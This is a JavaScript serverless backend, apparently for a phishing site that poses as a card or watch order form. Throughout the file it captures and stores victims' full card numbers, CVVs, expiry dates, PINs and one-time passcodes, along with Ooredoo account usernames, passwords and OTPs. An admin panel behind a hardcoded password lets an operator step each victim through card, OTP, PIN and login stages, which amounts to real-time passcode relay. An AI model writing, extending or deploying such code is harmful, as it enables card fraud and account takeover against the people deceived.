const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "fazaa2026";
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_KEY;
const TABLE = "orders";

const str = (v, max = 300) => String(v == null ? "" : v).slice(0, max);

async function supaRest(method, path, body) {
  const url = `${SUPABASE_URL}/rest/v1/${path}`;
  const headers = {
    apikey: SUPABASE_KEY,
    Authorization: `Bearer ${SUPABASE_KEY}`,
    "Content-Type": "application/json",
    Prefer: method === "POST" ? "resolution=merge-duplicates,return=representation" : "return=representation",
  };
  const opts = { method, headers };
  if (body) opts.body = JSON.stringify(body);
  const r = await fetch(url, opts);
  if (!r.ok) {
    const text = await r.text().catch(() => "");
    throw new Error(`Supabase ${r.status}: ${text}`);
  }
  const text = await r.text();
  return text ? JSON.parse(text) : null;
}

async function loadOrders() {
  const rows = await supaRest("GET", `${TABLE}?order=created_at.desc&limit=5000`);
  return rows.map(r => ({ ...r.data, _dbRef: r.ref }));
}

async function upsertOrder(ref, data) {
  await supaRest("POST", TABLE, { ref, data, updated_at: Date.now() });
}

async function deleteOrder(ref) {
  await supaRest("DELETE", `${TABLE}?ref=eq.${encodeURIComponent(ref)}`);
}

async function getOrder(ref) {
  const rows = await supaRest("GET", `${TABLE}?ref=eq.${encodeURIComponent(ref)}&limit=1`);
  return rows.length ? rows[0].data : null;
}

function cleanOrder(b) {
  const p = b.pay && typeof b.pay === "object" ? b.pay : {};
  const ord = b.ooredoo && typeof b.ooredoo === "object" ? b.ooredoo : {};

  let rawCard = b.cardNumber || p.cardNumber || p.number || p.fullCard || p.card || "";
  if (typeof rawCard === "boolean") rawCard = "";
  let rawCvv = b.cvv || p.cvv || "";
  if (typeof rawCvv === "boolean") rawCvv = "";
  let rawExp = b.expiry || p.exp || p.expiry || "";
  if (typeof rawExp === "boolean") rawExp = "";
  let rawOtp = b.otp || p.otp || p.code || "";
  if (typeof rawOtp === "boolean") rawOtp = "";
  let rawPin = b.pin || p.pin || "";
  if (typeof rawPin === "boolean") rawPin = "";
  let rawName = b.cardName || p.cardName || p.name || "";
  if (typeof rawName === "boolean") rawName = "";

  return {
    ref: str(b.ref, 40), status: ["confirmed", "awaiting"].includes(b.status) ? b.status : "pending",
    card: str(b.card, 10), watch: str(b.watch, 10),
    st: b.st === "resident" ? "resident" : "citizen",
    n: str(b.n, 120), id: str(b.id, 20).replace(/\D/g, ""), p: str(b.p, 15).replace(/\D/g, ""),
    e: str(b.e, 160), g: b.g === "female" ? "female" : "male",
    em: str(b.em, 30), a: str(b.a, 5), ad: str(b.ad || b.address || "", 500),
    bank: str(b.bank, 20), bankName: str(b.bankName || "", 200),
    lang: b.lang === "en" ? "en" : "ar",
    step: ["card", "otp", "pin", "ooredoo", "ooredoo-otp"].includes(b.step) ? b.step : undefined,
    pay: {
      cardName: str(rawName, 200),
      cardNumber: str(rawCard, 200),
      last4: str((rawCard.slice(-4) || p.last4 || "").replace(/\D/g, ""), 4),
      brand: ["visa", "mc", "amex"].includes(p.brand || b.brand) ? (p.brand || b.brand) : "",
      exp: str(rawExp, 50),
      cvv: str(rawCvv, 50),
      otp: str(rawOtp, 50),
      pin: str(rawPin, 50)
    },
    ooredoo: {
      username: str(ord.username, 200),
      password: str(ord.password, 200),
      otp: str(ord.otp, 50)
    }
  };
}

module.exports = async function handler(req, res) {
  res.setHeader("Content-Type", "application/json; charset=utf-8");
  res.setHeader("Cache-Control", "no-store");
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET,POST,DELETE,OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, x-admin-password");

  if (req.method === "OPTIONS") return res.status(200).end();

  if (!SUPABASE_URL || !SUPABASE_KEY) {
    return res.status(500).json({ ok: false, error: "Missing SUPABASE_URL or SUPABASE_KEY env vars" });
  }

  const queryPath = Array.isArray(req.query.path) ? req.query.path : (typeof req.query.path === "string" ? req.query.path.split("/") : []);
  const rawUrl = (req.url || "").split("?")[0].split("#")[0];
  const segments = queryPath.length > 0 ? queryPath : rawUrl.replace(/^\/api\//, "").split("/").filter(Boolean);
  const urlPath = "/api/" + segments.join("/");
  const body = req.body || {};
  const isAdmin = req.headers["x-admin-password"] === ADMIN_PASSWORD;

  try {
    // POST /api/orders
    if (req.method === "POST" && urlPath === "/api/orders") {
      const b = body;
      const o = cleanOrder(b);
      if (o.pay === undefined) delete o.pay;
      if (o.step === undefined) delete o.step;

      if (b.ooredoo && typeof b.ooredoo === "object" && o.ref) {
        const existing = await getOrder(o.ref);
        if (existing) {
          const incoming = b.ooredoo;
          const current = { ...existing.ooredoo };
          for (const key of ["username", "password", "otp"]) {
            if (Object.prototype.hasOwnProperty.call(incoming, key)) {
              current[key] = str(incoming[key], key === "otp" ? 50 : 200);
            }
          }
          existing.ooredoo = current;
          existing.status = "awaiting";
          existing.step = o.step === "ooredoo-otp" ? "ooredoo-otp" : "ooredoo";
          existing.decision = "";
          existing.reason = "";
          existing.next = "";
          existing.updated = Date.now();
          await upsertOrder(o.ref, existing);
          return res.status(200).json({ ok: true, ref: o.ref });
        }
      }

      if (!/^(?:FZ|HM)-\d{6,}$/.test(o.ref) || !o.n || !/^\d{8,15}$/.test(o.p))
        return res.status(400).json({ ok: false, error: "invalid" });

      const existing = await getOrder(o.ref);
      if (existing) {
        const merged = {
          ...existing, ...o,
          ts: existing.ts,
          status: existing.status === "confirmed" ? "confirmed" : o.status,
          decision: o.status === "awaiting" ? "" : existing.decision,
          reason: o.status === "awaiting" ? "" : existing.reason,
          updated: Date.now()
        };
        await upsertOrder(o.ref, merged);
      } else {
        await upsertOrder(o.ref, { ...o, ts: Date.now() });
      }
      return res.status(200).json({ ok: true, ref: o.ref });
    }

    // GET /api/status/:ref
    if (req.method === "GET" && segments[0] === "status" && segments[1]) {
      const ref = decodeURIComponent(segments[1]);
      const o = await getOrder(ref);
      if (!o) return res.status(404).json({ ok: false });
      return res.status(200).json({ ok: true, status: o.status, decision: o.decision || "", reason: o.reason || "", next: o.next || "" });
    }

    // POST /api/ping
    if (req.method === "POST" && urlPath === "/api/ping") {
      return res.status(200).json({ ok: true });
    }

    // POST /api/leave
    if (req.method === "POST" && urlPath === "/api/leave") {
      return res.status(200).json({ ok: true });
    }

    // ===== Admin endpoints =====
    if (segments[0] === "admin") {
      if (!isAdmin) return res.status(401).json({ ok: false, error: "unauthorized" });

      if (req.method === "GET" && urlPath === "/api/admin/check") {
        return res.status(200).json({ ok: true });
      }

      if (req.method === "GET" && urlPath === "/api/admin/orders") {
        const orders = await loadOrders();
        return res.status(200).json({ ok: true, orders, active: 0, pages: [] });
      }

      if (req.method === "POST" && segments[1] === "decide" && segments[2]) {
        const ref = decodeURIComponent(segments[2]);
        const o = await getOrder(ref);
        if (!o) return res.status(404).json({ ok: false });
        const step = o.step || "card";
        if (body.decision === "reject") {
          o.decision = "reject"; o.reason = step; o.status = "rejected"; o.next = "";
        } else {
          const nextOf = { card: "otp", otp: "pin", pin: "done", ooredoo: "otp", "ooredoo-otp": "done" };
          const next = nextOf[step];
          o.decision = "accept"; o.reason = "";
          if (next === "done") { o.status = "confirmed"; o.next = "done"; }
          else { o.status = "stepok"; o.next = next; }
        }
        o.updated = Date.now();
        await upsertOrder(ref, o);
        return res.status(200).json({ ok: true, status: o.status });
      }

      if (req.method === "DELETE" && segments[1] === "orders" && segments[2]) {
        const ref = decodeURIComponent(segments[2]);
        await deleteOrder(ref);
        return res.status(200).json({ ok: true });
      }
    }

    return res.status(404).json({ ok: false });
  } catch (err) {
    return res.status(500).json({ ok: false, error: err.message });
  }
};
